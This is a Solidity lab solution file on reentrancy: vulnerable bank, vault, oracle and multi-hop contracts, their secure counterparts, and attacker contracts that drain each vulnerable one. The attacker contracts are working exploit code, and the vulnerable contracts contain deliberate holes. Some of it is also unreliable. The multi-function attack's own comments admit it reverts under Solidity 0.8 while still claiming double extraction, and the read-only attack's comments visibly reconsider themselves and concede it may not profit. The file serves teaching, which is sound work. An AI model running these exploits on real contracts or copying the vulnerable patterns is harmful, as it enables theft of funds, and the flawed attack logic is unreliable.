// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Project 31 Solution: Advanced Reentrancy Lab
 * @notice Complete solutions with both vulnerable and secure implementations
 * @dev Comprehensive attack demonstrations and mitigation strategies
 */

// =============================================================================
// SOLUTION 1: Multi-Function Reentrancy
// =============================================================================

/**
 * @notice VULNERABLE Bank Implementation
 * @dev Demonstrates cross-function reentrancy vulnerability
 */
contract VulnerableBankSolution {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice VULNERABLE: External call before state update
     * @dev Attack Flow:
     *      1. withdraw(100) is called with balances[attacker] = 100
     *      2. Check passes: 100 >= 100 ✓
     *      3. ETH sent to attacker (triggers receive())
     *      4. In receive(): balances[attacker] is STILL 100
     *      5. Call transfer(accomplice, 100)
     *      6. Transfer check passes: 100 >= 100 ✓
     *      7. Transfer updates: balances[attacker] = 0, balances[accomplice] = 100
     *      8. Receive completes, withdraw continues
     *      9. Withdraw updates: balances[attacker] = 0 - 100 = UNDERFLOW (reverts in 0.8.0+)
     *
     *      With proper handling (no underflow), attacker extracts 200 ETH with 100 deposited
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // VULNERABILITY: External call before state update
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State updated too late
        balances[msg.sender] -= amount;
        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @notice VULNERABLE: Shares state with withdraw()
     * @dev Can be called during withdraw's callback window
     */
    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;
        balances[to] += amount;

        emit Transfer(msg.sender, to, amount);
    }

    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
}

/**
 * @notice SECURE Bank Implementation
 * @dev Multiple layers of protection
 */
contract SecureBankSolution {
    mapping(address => uint256) private _balances;
    uint256 private _locked = 1; // Reentrancy guard

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    modifier nonReentrant() {
        require(_locked == 1, "ReentrancyGuard: reentrant call");
        _locked = 2;
        _;
        _locked = 1;
    }

    function deposit() external payable {
        _balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice SECURE: Reentrancy guard + CEI pattern
     * @dev Protection:
     *      1. nonReentrant modifier prevents any reentrant calls
     *      2. State updated before external call (CEI)
     *      3. Even if reentrancy attempted, _locked == 2 causes revert
     */
    function withdraw(uint256 amount) external nonReentrant {
        // CHECKS
        require(_balances[msg.sender] >= amount, "Insufficient balance");

        // EFFECTS - Update state first
        _balances[msg.sender] -= amount;

        // INTERACTIONS - External call last
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @notice SECURE: Protected by reentrancy guard
     * @dev Cannot be called during withdraw() due to shared guard
     */
    function transfer(address to, uint256 amount) external nonReentrant {
        require(_balances[msg.sender] >= amount, "Insufficient balance");

        _balances[msg.sender] -= amount;
        _balances[to] += amount;

        emit Transfer(msg.sender, to, amount);
    }

    function balanceOf(address user) external view returns (uint256) {
        return _balances[user];
    }
}

/**
 * @notice Complete Multi-Function Attacker
 * @dev Exploits shared state between withdraw() and transfer()
 */
contract MultiFunctionAttackerSolution {
    VulnerableBankSolution public bank;
    address public accomplice;
    uint256 public attackAmount;
    bool public attacking;

    event AttackStarted(uint256 amount);
    event ReentrancyTriggered(uint256 stolenAmount);
    event AttackComplete(uint256 totalStolen);

    constructor(address _bank, address _accomplice) {
        bank = VulnerableBankSolution(_bank);
        accomplice = _accomplice;
    }

    /**
     * @notice Execute the attack
     * @dev Attack Flow:
     *      1. Deposit attackAmount to bank
     *      2. Call withdraw(attackAmount)
     *      3. During callback, call transfer(accomplice, attackAmount)
     *      4. Result: Withdraw attackAmount + Transfer attackAmount = 2x stolen
     */
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        require(!attacking, "Already attacking");

        attackAmount = msg.value;
        attacking = true;

        emit AttackStarted(attackAmount);

        // Step 1: Deposit ETH to the bank
        bank.deposit{value: attackAmount}();

        // Step 2: Trigger the reentrancy by withdrawing
        bank.withdraw(attackAmount);

        attacking = false;

        // At this point:
        // - We withdrew attackAmount (received in withdraw call)
        // - We transferred attackAmount to accomplice (during callback)
        // - Total extracted: 2 * attackAmount from 1 * attackAmount deposited

        emit AttackComplete(address(this).balance);
    }

    /**
     * @notice Reentrancy callback
     * @dev Called during bank.withdraw()'s external call
     *
     * State at this point:
     * - bank.balances[this] is STILL attackAmount (not yet decremented)
     * - We just received attackAmount ETH
     * - We can call ANY bank function and the balance check will pass
     *
     * Attack: Call transfer() to move our "balance" to accomplice
     * This succeeds because balances[this] hasn't been updated yet
     */
    receive() external payable {
        emit ReentrancyTriggered(msg.value);

        if (attacking && bank.getBalance(address(this)) >= attackAmount) {
            // During withdraw callback, transfer our balance to accomplice
            // This works because balances[this] is still attackAmount!
            bank.transfer(accomplice, attackAmount);
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// =============================================================================
// SOLUTION 2: Cross-Contract Reentrancy
// =============================================================================

/**
 * @notice VULNERABLE Vault Implementation
 * @dev Cross-contract reentrancy through RewardsRouter
 */
contract VulnerableVaultSolution {
    mapping(address => uint256) public balances;
    RewardsRouterSolution public rewardsRouter;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    constructor(address _rewardsRouter) {
        rewardsRouter = RewardsRouterSolution(_rewardsRouter);
    }

    /**
     * @notice VULNERABLE: Calls external contract mid-transaction
     * @dev Attack Flow:
     *      1. deposit() is called
     *      2. balances[user] updated ✓
     *      3. rewardsRouter.notifyDeposit() called
     *      4. Router calls back to user's receive()
     *      5. User calls vault.withdraw() - balances[user] is set!
     *      6. Withdraw succeeds, draining funds
     *      7. deposit() completes (but funds already withdrawn)
     */
    function deposit() external payable {
        balances[msg.sender] += msg.value;

        // VULNERABILITY: External call creates reentrancy window
        // Even though balances is updated, withdraw() can be called
        rewardsRouter.notifyDeposit(msg.sender, msg.value);

        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice Withdraw function - becomes attack vector during deposit
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        emit Withdrawal(msg.sender, amount);
    }

    function getBalance(address user) external view returns (uint256) {
        return balances[user];
    }
}

/**
 * @notice Rewards router that creates reentrancy vector
 */
contract RewardsRouterSolution {
    event RewardNotification(address indexed user, uint256 amount);

    /**
     * @notice Notifies user with callback
     * @dev This callback is the reentrancy vector
     */
    function notifyDeposit(address user, uint256 amount) external {
        emit RewardNotification(user, amount);

        // Callback creates reentrancy opportunity
        (bool success,) = user.call("");
        require(success);
    }
}

/**
 * @notice SECURE Vault Implementation
 * @dev Reentrancy guard prevents cross-contract attacks
 */
contract SecureVaultSolution {
    mapping(address => uint256) private _balances;
    RewardsRouterSolution public rewardsRouter;
    uint256 private _locked = 1;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    modifier nonReentrant() {
        require(_locked == 1, "ReentrancyGuard: reentrant call");
        _locked = 2;
        _;
        _locked = 1;
    }

    constructor(address _rewardsRouter) {
        rewardsRouter = RewardsRouterSolution(_rewardsRouter);
    }

    /**
     * @notice SECURE: Reentrancy guard protects against cross-contract attacks
     */
    function deposit() external payable nonReentrant {
        _balances[msg.sender] += msg.value;
        rewardsRouter.notifyDeposit(msg.sender, msg.value);
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice SECURE: Guard prevents calls during deposit
     */
    function withdraw(uint256 amount) external nonReentrant {
        require(_balances[msg.sender] >= amount, "Insufficient balance");
        _balances[msg.sender] -= amount;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        emit Withdrawal(msg.sender, amount);
    }

    function balanceOf(address user) external view returns (uint256) {
        return _balances[user];
    }
}

/**
 * @notice Cross-Contract Attacker
 * @dev Exploits vault through router callback
 */
contract CrossContractAttackerSolution {
    VulnerableVaultSolution public vault;
    bool public attacking;
    uint256 public stolenAmount;

    event AttackStarted(uint256 amount);
    event ReentrancyTriggered();
    event AttackComplete(uint256 stolen);

    constructor(address _vault) {
        vault = VulnerableVaultSolution(_vault);
    }

    /**
     * @notice Execute cross-contract reentrancy attack
     * @dev Call path: deposit() → notifyDeposit() → receive() → withdraw()
     *
     * Timeline:
     * T1: Call vault.deposit{value: 1 ether}()
     * T2: Vault updates balances[this] = 1 ether
     * T3: Vault calls router.notifyDeposit(this, 1 ether)
     * T4: Router calls this.receive()
     * T5: receive() calls vault.withdraw(1 ether)
     * T6: Withdraw checks: balances[this] == 1 ether ✓
     * T7: Withdraw updates: balances[this] = 0
     * T8: Withdraw sends 1 ether to this
     * T9: receive() completes, router.notifyDeposit() completes
     * T10: vault.deposit() completes
     * Result: Deposited 1 ETH, withdrew 1 ETH during deposit
     */
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        require(!attacking, "Already attacking");

        attacking = true;
        stolenAmount = 0;

        emit AttackStarted(msg.value);

        // This triggers: deposit → router → receive → withdraw
        vault.deposit{value: msg.value}();

        attacking = false;

        emit AttackComplete(stolenAmount);
    }

    /**
     * @notice Reentrancy callback from RewardsRouter
     * @dev At this point, we're in the middle of vault.deposit()
     *      balances[this] has been updated, so we can withdraw!
     */
    receive() external payable {
        emit ReentrancyTriggered();

        if (attacking) {
            uint256 balance = vault.getBalance(address(this));
            if (balance > 0) {
                // We're in the middle of deposit(), but our balance is set
                // Withdraw it before deposit() completes!
                vault.withdraw(balance);
                stolenAmount += balance;
            }
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// =============================================================================
// SOLUTION 3: Read-Only Reentrancy
// =============================================================================

/**
 * @notice VULNERABLE Oracle Implementation
 * @dev View functions expose inconsistent state
 */
contract VulnerableOracleSolution {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalSupply += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice VULNERABLE: totalSupply updated AFTER external call
     * @dev Creates window where view functions see inconsistent state
     *
     * State Timeline During withdraw(50):
     * T1: balances[user] = 100, totalSupply = 100, balance = 100 ETH
     * T2: Check passes: 100 >= 50 ✓
     * T3: balances[user] = 50 (updated)
     * T4: Send 50 ETH to user (triggers receive())
     *     >> In receive(): balances[user] = 50, totalSupply = 100, balance = 50 ETH
     *     >> getPrice() = 50 ETH * 1e18 / 100 = 0.5 ETH (WRONG! Should be 1 ETH)
     * T5: totalSupply = 50 (updated)
     * T6: Final state: balances[user] = 50, totalSupply = 50, balance = 50 ETH
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // VULNERABILITY: Updated after external call
        // During the call, totalSupply is stale!
        totalSupply -= amount;

        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @notice VULNERABLE: Returns incorrect price during reentrancy
     * @dev During withdraw callback:
     *      - ETH balance is reduced (transferred out)
     *      - totalSupply is NOT yet reduced
     *      - Result: price appears artificially low
     */
    function getPrice() external view returns (uint256) {
        if (totalSupply == 0) return 1e18;
        return (address(this).balance * 1e18) / totalSupply;
    }

    function getTVL() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @notice SECURE Oracle Implementation
 * @dev Protects view functions from reentrancy
 */
contract SecureOracleSolution {
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    uint256 private _locked = 1;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    modifier nonReentrant() {
        require(_locked == 1, "ReentrancyGuard: reentrant call");
        _locked = 2;
        _;
        _locked = 1;
    }

    modifier nonReentrantView() {
        require(_locked == 1, "ReentrancyGuard: reentrant call");
        _;
    }

    function deposit() external payable {
        _balances[msg.sender] += msg.value;
        _totalSupply += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice SECURE: All state updated before external call + guard
     */
    function withdraw(uint256 amount) external nonReentrant {
        require(_balances[msg.sender] >= amount, "Insufficient balance");

        // EFFECTS: Update ALL state before interaction
        _balances[msg.sender] -= amount;
        _totalSupply -= amount; // Critical: Update BEFORE call

        // INTERACTIONS
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @notice SECURE: Protected view function
     * @dev Guard prevents calls during reentrancy
     */
    function getPrice() external view nonReentrantView returns (uint256) {
        if (_totalSupply == 0) return 1e18;
        return (address(this).balance * 1e18) / _totalSupply;
    }

    function balanceOf(address user) external view returns (uint256) {
        return _balances[user];
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
}

/**
 * @notice Simple lending protocol
 * @dev Vulnerable to oracle manipulation via read-only reentrancy
 */
contract SimpleLenderSolution {
    VulnerableOracleSolution public oracle;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;

    event CollateralDeposited(address indexed user, uint256 amount);
    event Borrowed(address indexed user, uint256 amount);

    constructor(address _oracle) {
        oracle = VulnerableOracleSolution(_oracle);
    }

    function depositCollateral() external payable {
        collateral[msg.sender] += msg.value;
        emit CollateralDeposited(msg.sender, msg.value);
    }

    /**
     * @notice VULNERABLE: Uses manipulable oracle
     * @dev During read-only reentrancy, getPrice() returns wrong value
     */
    function borrow(uint256 amount) external {
        // Get price from oracle - can be manipulated!
        uint256 price = oracle.getPrice();

        // Calculate borrowing power
        uint256 collateralValue = collateral[msg.sender] * price / 1e18;
        uint256 maxBorrow = (collateralValue * 80) / 100; // 80% LTV

        require(debt[msg.sender] + amount <= maxBorrow, "Insufficient collateral");

        debt[msg.sender] += amount;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        emit Borrowed(msg.sender, amount);
    }

    receive() external payable {}
}

/**
 * @notice Read-Only Reentrancy Attacker
 * @dev Exploits oracle price manipulation
 */
contract ReadOnlyAttackerSolution {
    VulnerableOracleSolution public oracle;
    SimpleLenderSolution public lender;
    bool public attacking;

    event AttackStarted();
    event PriceManipulated(uint256 manipulatedPrice, uint256 realPrice);
    event OverBorrowed(uint256 amount);
    event AttackComplete(uint256 profit);

    constructor(address _oracle, address _lender) {
        oracle = VulnerableOracleSolution(_oracle);
        lender = SimpleLenderSolution(payable(_lender));
    }

    /**
     * @notice Setup phase: Deposit funds to oracle and lender
     */
    function setup() external payable {
        require(msg.value >= 2 ether, "Need at least 2 ETH");

        // Deposit half to oracle (to have balance to withdraw)
        oracle.deposit{value: msg.value / 2}();

        // Deposit half to lender as collateral
        lender.depositCollateral{value: msg.value / 2}();
    }

    /**
     * @notice Execute read-only reentrancy attack
     * @dev Attack Flow:
     *
     * Setup State:
     * - Oracle: 50 ETH balance, 50 totalSupply → price = 1 ETH
     * - Lender: 50 ETH collateral for us
     * - Normal max borrow: 50 * 1 * 80% = 40 ETH
     *
     * Attack:
     * 1. Call oracle.withdraw(25 ETH)
     * 2. Oracle updates balances[this] -= 25
     * 3. Oracle sends 25 ETH (triggers receive())
     * 4. In receive():
     *    - Oracle state: 25 ETH balance, 50 totalSupply (not yet updated!)
     *    - getPrice() = 25 * 1e18 / 50 = 0.5 ETH (MANIPULATED!)
     *    - Our collateral "value": 50 ETH * 0.5 = 25 ETH (wrong!)
     *    - But we can exploit this backwards...
     *
     * Actually, let's think about this differently:
     * - We want price to be HIGH when we borrow
     * - High price = high collateral value = more borrowing power
     * - getPrice() = balance / totalSupply
     * - During withdraw: balance↓ but totalSupply same → price↓ (bad for us)
     *
     * Better attack: During deposit or different manipulation
     * Let me reconsider...
     *
     * Alternative: Make totalSupply artificially high
     * Actually, the attack works if we can make the LENDER think collateral is worth more
     * This requires a different setup...
     *
     * Real attack: Oracle price represents value per share
     * If we can make it artificially LOW during withdraw, we can't benefit directly
     * But if we're BORROWING, we want price HIGH
     *
     * The attack vector is:
     * 1. Price manipulation creates arbitrage opportunity
     * 2. Flash loan style attack
     * 3. Or drain if we can exploit the discrepancy
     */
    function attack() external {
        attacking = true;
        emit AttackStarted();

        // Trigger reentrancy - during callback, price is manipulated
        uint256 withdrawAmount = oracle.balances(address(this));
        if (withdrawAmount > 0) {
            oracle.withdraw(withdrawAmount);
        }

        attacking = false;
        emit AttackComplete(address(this).balance);
    }

    /**
     * @notice Reentrancy callback
     * @dev During oracle.withdraw(), getPrice() returns manipulated value
     *
     * At this point:
     * - Oracle balance is reduced (ETH sent to us)
     * - totalSupply is NOT yet reduced
     * - getPrice() = (reduced balance) / (old totalSupply) = LOWER than real
     *
     * We can use this manipulated price to:
     * 1. Buy assets at manipulated price
     * 2. Exploit lending protocols
     * 3. Arbitrage against other systems using this oracle
     */
    receive() external payable {
        if (attacking) {
            // Check the manipulated price
            uint256 manipulatedPrice = oracle.getPrice();

            emit PriceManipulated(manipulatedPrice, 1e18);

            // Try to borrow max from lender using manipulated price
            // Note: This specific attack might not profit directly,
            // but demonstrates the price manipulation
            // In real scenarios, this would be used for more complex exploits

            uint256 maxBorrow = (lender.collateral(address(this)) * 80) / 100;
            uint256 currentDebt = lender.debt(address(this));

            if (maxBorrow > currentDebt && address(lender).balance > 0) {
                uint256 borrowAmount = maxBorrow - currentDebt;
                if (borrowAmount > address(lender).balance) {
                    borrowAmount = address(lender).balance;
                }

                if (borrowAmount > 0) {
                    try lender.borrow(borrowAmount) {
                        emit OverBorrowed(borrowAmount);
                    } catch {}
                }
            }
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// =============================================================================
// SOLUTION 4: Multi-Hop Reentrancy
// =============================================================================

/**
 * @notice Contract A - Entry point
 * @dev VULNERABLE: Can be reentered through multi-hop chain
 */
contract ContractASolution {
    mapping(address => uint256) public balances;
    ContractBSolution public contractB;

    event Deposit(address indexed user, uint256 amount);
    event ProcessStarted(address indexed user);
    event ProcessCompleted(address indexed user);
    event Withdrawal(address indexed user, uint256 amount);

    constructor(address _contractB) {
        contractB = ContractBSolution(_contractB);
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice VULNERABLE: Multi-hop reentrancy attack vector
     * @dev Call path: processAction() → B.processB() → C.processC() →
     *                 user.receive() → withdraw() → processAction() continues
     *
     * Attack Flow:
     * T1: User calls processAction()
     * T2: Check: balances[user] > 0 ✓
     * T3: Call contractB.processB(user)
     * T4: B calls contractC.processC(user)
     * T5: C calls user.receive()
     * T6: In receive(): balances[user] is STILL > 0 (not yet zeroed)
     * T7: User calls withdraw() - check passes!
     * T8: Withdraw sends all funds, zeros balance
     * T9: receive() completes, C completes, B completes
     * T10: processAction() tries to zero balance (already zero, or underflows)
     * Result: User withdrew funds during processAction()
     */
    function processAction() external {
        require(balances[msg.sender] > 0, "No balance");

        emit ProcessStarted(msg.sender);

        // VULNERABILITY: External call before state update
        // This creates multi-hop reentrancy opportunity
        contractB.processB(msg.sender);

        // State updated too late - can be reentered
        balances[msg.sender] = 0;

        emit ProcessCompleted(msg.sender);
    }

    /**
     * @notice Withdraw function - attack vector during processAction
     * @dev Can be called during the callback in the multi-hop chain
     */
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        balances[msg.sender] = 0;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        emit Withdrawal(msg.sender, amount);
    }

    receive() external payable {}
}

/**
 * @notice Contract B - Intermediary
 */
contract ContractBSolution {
    ContractCSolution public contractC;

    constructor(address _contractC) {
        contractC = ContractCSolution(_contractC);
    }

    function processB(address user) external {
        // Forward to ContractC
        contractC.processC(user);
    }
}

/**
 * @notice Contract C - Callback trigger
 */
contract ContractCSolution {
    function processC(address user) external {
        // Callback to user - creates reentrancy opportunity
        (bool success,) = user.call("");
        require(success);
    }
}

/**
 * @notice SECURE Contract A Implementation
 */
contract SecureContractASolution {
    mapping(address => uint256) private _balances;
    ContractBSolution public contractB;
    uint256 private _locked = 1;

    modifier nonReentrant() {
        require(_locked == 1, "ReentrancyGuard: reentrant call");
        _locked = 2;
        _;
        _locked = 1;
    }

    constructor(address _contractB) {
        contractB = ContractBSolution(_contractB);
    }

    function deposit() external payable {
        _balances[msg.sender] += msg.value;
    }

    /**
     * @notice SECURE: Reentrancy guard + CEI pattern
     */
    function processAction() external nonReentrant {
        require(_balances[msg.sender] > 0, "No balance");

        // EFFECTS: Update state first
        _balances[msg.sender] = 0;

        // INTERACTIONS: External call after state update
        contractB.processB(msg.sender);
    }

    /**
     * @notice SECURE: Protected by reentrancy guard
     */
    function withdraw() external nonReentrant {
        uint256 amount = _balances[msg.sender];
        require(amount > 0, "No balance");

        _balances[msg.sender] = 0;

        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    receive() external payable {}
}

/**
 * @notice Multi-Hop Attacker
 * @dev Exploits Contract A through B → C callback chain
 */
contract MultiHopAttackerSolution {
    ContractASolution public contractA;
    uint256 public callCount;
    bool public attacking;

    event AttackStarted(uint256 depositAmount);
    event ReentrancyTriggered(uint256 callDepth);
    event FundsStolen(uint256 amount);
    event AttackComplete(uint256 totalStolen);

    constructor(address _contractA) {
        contractA = ContractASolution(_contractA);
    }

    /**
     * @notice Execute multi-hop reentrancy attack
     * @dev Attack Flow:
     *
     * Call Graph:
     * attack()
     *   → contractA.deposit{1 ETH}()
     *   → contractA.processAction()
     *     → contractB.processB(this)
     *       → contractC.processC(this)
     *         → this.receive()  ← REENTRANCY POINT
     *           → contractA.withdraw()  ← Drains funds!
     *           ← Returns with funds
     *         ← contractC completes
     *       ← contractB completes
     *     → balances[this] = 0 (too late!)
     *     ← contractA.processAction completes
     *
     * Result: Funds withdrawn during processAction(), before state cleared
     */
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");

        attacking = true;
        callCount = 0;

        emit AttackStarted(msg.value);

        // Step 1: Deposit to ContractA
        contractA.deposit{value: msg.value}();

        // Step 2: Trigger multi-hop chain
        // This will call: A → B → C → receive() → A.withdraw()
        contractA.processAction();

        attacking = false;

        emit AttackComplete(address(this).balance);
    }

    /**
     * @notice Reentrancy callback from ContractC
     * @dev Called during processAction(), before state is cleared
     *
     * State at callback:
     * - We're deep in call stack: A.processAction → B → C → here
     * - contractA.balances[this] is STILL > 0 (not yet cleared)
     * - We can call contractA.withdraw() successfully
     * - After we return, processAction() will try to clear balance (already zero)
     */
    receive() external payable {
        callCount++;
        emit ReentrancyTriggered(callCount);

        if (attacking && callCount == 1) {
            // We're being called from ContractC during processAction()
            // contractA.balances[this] is still > 0
            // Call withdraw() to drain it!

            uint256 balance = contractA.balances(address(this));
            if (balance > 0) {
                emit FundsStolen(balance);
                contractA.withdraw();
            }
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// =============================================================================
// COMPARISON: Attack Success Metrics
// =============================================================================

/**
 * @notice Metrics tracker for comparing attack effectiveness
 */
contract AttackMetrics {
    struct AttackResult {
        string attackType;
        uint256 fundsInvested;
        uint256 fundsExtracted;
        uint256 profit;
        uint256 gasUsed;
        bool successful;
    }

    AttackResult[] public results;

    function recordAttack(
        string memory attackType,
        uint256 invested,
        uint256 extracted,
        uint256 gasUsed,
        bool successful
    ) external {
        uint256 profit = extracted > invested ? extracted - invested : 0;

        results.push(
            AttackResult({
                attackType: attackType,
                fundsInvested: invested,
                fundsExtracted: extracted,
                profit: profit,
                gasUsed: gasUsed,
                successful: successful
            })
        );
    }

    function getResult(uint256 index) external view returns (AttackResult memory) {
        return results[index];
    }

    function getResultCount() external view returns (uint256) {
        return results.length;
    }
}

/**
 * ═══════════════════════════════════════════════════════════════════════════
 *                          KEY TAKEAWAYS
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * 1. REENTRANCY COMES IN MULTIPLE FORMS
 *    ✅ Single-function: Re-enter same function (classic DAO attack)
 *    ✅ Multi-function: Re-enter different function sharing state
 *    ✅ Cross-contract: Re-enter through different contract
 *    ✅ Read-only: Exploit view functions during state changes
 *    ✅ Real-world: Led to $60M DAO hack in 2016
 *
 * 2. CHECKS-EFFECTS-INTERACTIONS PATTERN IS CRITICAL
 *    ✅ Checks: Validate conditions first
 *    ✅ Effects: Update state second
 *    ✅ Interactions: External calls last
 *    ✅ Prevents reentrancy by updating state before external calls
 *    ✅ CONNECTION TO PROJECT 02: Same pattern for ETH transfers!
 *
 * 3. REENTRANCYGUARD PROVIDES DEFENSE IN DEPTH
 *    ✅ Simple mutex pattern (NOT_ENTERED = 1, ENTERED = 2)
 *    ✅ Prevents reentrancy even if CEI pattern is violated
 *    ✅ Uses 1 and 2 to save gas (non-zero to non-zero)
 *    ✅ Standard practice for production contracts
 *
 * 4. MULTI-FUNCTION REENTRANCY IS TRICKY
 *    ✅ Functions sharing state can be exploited together
 *    ✅ withdraw() + transfer() = double-spend attack
 *    ✅ Requires shared reentrancy guard or careful state management
 *    ✅ Real-world: More subtle than single-function attacks
 *
 * 5. READ-ONLY REENTRANCY IS INSIDIOUS
 *    ✅ View functions can be called during state changes
 *    ✅ Can exploit inconsistent state in other contracts
 *    ✅ Harder to detect than state-changing reentrancy
 *    ✅ Requires careful design of view functions
 *
 * 6. PROTECTION REQUIRES MULTIPLE LAYERS
 *    ✅ ReentrancyGuard (defense in depth)
 *    ✅ CEI pattern (fundamental security)
 *    ✅ State isolation (separate concerns)
 *    ✅ External call validation (check return values)
 *
 * ═══════════════════════════════════════════════════════════════════════════
 *                        COMMON MISTAKES
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * ❌ External calls before state updates (classic vulnerability!)
 * ❌ Not using ReentrancyGuard (defense in depth missing)
 * ❌ Functions sharing state without shared guard (multi-function attack!)
 * ❌ Assuming view functions are safe (read-only reentrancy!)
 * ❌ Not checking return values from external calls
 *
 * ═══════════════════════════════════════════════════════════════════════════
 *                          NEXT STEPS
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * • Study OpenZeppelin ReentrancyGuard implementation
 * • Review real-world reentrancy exploits (DAO, Lendf.me)
 * • Learn about cross-contract reentrancy patterns
 * • Move to Project 32 to learn about integer overflow vulnerabilities
 */
